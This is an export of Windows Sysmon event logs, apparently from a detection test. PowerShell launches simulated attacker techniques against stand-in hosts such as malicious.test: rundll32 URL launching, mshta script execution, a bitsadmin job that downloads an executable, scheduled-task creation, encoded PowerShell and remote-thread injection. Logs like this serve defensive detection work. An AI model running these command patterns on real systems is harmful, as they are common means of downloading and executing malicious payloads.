FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/29 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:04:59.309
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92cb-6928-2113-000000000b00}
TargetProcessId: 13360
TargetImage: <unknown process>
NewThreadId: 6676
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:59.074
ProcessGuid: {3a35410f-92cb-6928-2013-000000000b00}
ProcessId: 13104
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=43 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11590512057 --metrics-shmem-handle=6764,i,12726625964761214083,14482088644648743941,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709026604671001 --mojo-platform-channel-handle=9416 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:59 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:59.034
ProcessGuid: {3a35410f-92cb-6928-1f13-000000000b00}
ProcessId: 12580
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test29') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:58 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:58.466
ProcessGuid: {3a35410f-92ca-6928-1e13-000000000b00}
ProcessId: 7124
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0x104,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92ca-6928-1b13-000000000b00}
ParentProcessId: 4172
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/28
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:58 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:58.102
ProcessGuid: {3a35410f-92ca-6928-1b13-000000000b00}
ProcessId: 4172
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/28
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92c9-6928-0b13-000000000b00}
ParentProcessId: 5264
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/28 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:58 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:58.043
ProcessGuid: {3a35410f-92ca-6928-1a13-000000000b00}
ProcessId: 3836
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAyADgAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:58 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:04:58.047
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask28
CreationUtcTime: 2025-11-27 18:04:58.047
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.912
ProcessGuid: {3a35410f-92c9-6928-1913-000000000b00}
ProcessId: 7616
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.799
ProcessGuid: {3a35410f-92c9-6928-1713-000000000b00}
ProcessId: 10716
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job28 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.784
ProcessGuid: {3a35410f-92c9-6928-1613-000000000b00}
ProcessId: 15184
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=42 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11589395164 --metrics-shmem-handle=6656,i,17566552404273019828,4108131380625459105,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709025667629152 --mojo-platform-channel-handle=8396 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.683
ProcessGuid: {3a35410f-92c9-6928-1413-000000000b00}
ProcessId: 13984
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job28 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.525
ProcessGuid: {3a35410f-92c9-6928-1213-000000000b00}
ProcessId: 1232
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job28 http://example.com/file.exe C:\Temp\file28.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.442
ProcessGuid: {3a35410f-92c9-6928-1013-000000000b00}
ProcessId: 13672
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job28 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:04:57.343
ProcessGuid: {3a35410f-92c7-6928-0513-000000000b00}
ProcessId: 13748
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_3imfsgh3.rjo.ps1
CreationUtcTime: 2025-11-27 18:04:57.343
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.354
ProcessGuid: {3a35410f-92c9-6928-0e13-000000000b00}
ProcessId: 15004
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask28 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.221
ProcessGuid: {3a35410f-92c9-6928-0c13-000000000b00}
ProcessId: 13856
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask28 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:57 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:57.039
ProcessGuid: {3a35410f-92c9-6928-0b13-000000000b00}
ProcessId: 5264
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/28 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:56 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:04:56.969
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92c8-6928-0a13-000000000b00}
TargetProcessId: 10216
TargetImage: <unknown process>
NewThreadId: 8952
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:34:56 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:04:56.843
ProcessGuid: {3a35410f-92c8-6928-0913-000000000b00}
ProcessId: 12488
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test28') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
